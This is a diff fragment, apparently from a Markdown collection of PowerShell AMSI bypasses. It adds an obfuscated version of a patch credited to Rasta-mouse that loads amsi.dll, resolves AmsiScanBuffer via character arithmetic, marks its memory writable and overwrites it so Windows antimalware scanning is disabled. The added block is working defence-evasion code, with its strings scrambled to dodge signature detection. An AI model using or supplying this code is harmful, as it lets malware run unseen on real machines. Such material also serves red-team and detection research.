@@ -290,3 +290,34 @@ $p = 0
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
+
+```
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$jkgdk = @"
+using System;
+using System.Runtime.InteropServices;
+public class jkgdk {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr heford, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $jkgdk
+
+$zkxmrhj = [jkgdk]::LoadLibrary("$(('äm'+'sì'+'.d'+'ll').nOrMaLize([Char](14+56)+[CHar](111+74-74)+[chAR]([BYtE]0x72)+[chAr]([Byte]0x6d)+[CHar](68+36-36)) -replace [cHaR](92)+[CHAr]([BYte]0x70)+[Char](123)+[CHaR]([BYTE]0x4d)+[ChAR]([byte]0x6e)+[cHar]([bytE]0x7d))")
+$pcrutl = [jkgdk]::GetProcAddress($zkxmrhj, "$([char](65*12/12)+[CHaR](92+17)+[chAr]([BYTE]0x73)+[cHar]([byte]0x69)+[chAR]([bYtE]0x53)+[chAr]([byTe]0x63)+[CHaR]([BYTe]0x61)+[Char](106+4)+[CHar]([ByTE]0x42)+[chaR]([bYTe]0x75)+[chAr]([BYtE]0x66)+[CHAR](102)+[CHaR]([ByTe]0x65)+[CHAr](110+4))")
+$p = 0
+[jkgdk]::VirtualProtect($pcrutl, [uint32]5, 0x40, [ref]$p)
+$dlml = "0xB8"
+$fobf = "0x57"
+$fwrr = "0x00"
+$cvhm = "0x07"
+$eych = "0x80"
+$ywnm = "0xC3"
+$bpqoq = [Byte[]] ($dlml,$fobf,$fwrr,$cvhm,+$eych,+$ywnm)
+[System.Runtime.InteropServices.Marshal]::Copy($bpqoq, 0, $pcrutl, 6)
+```
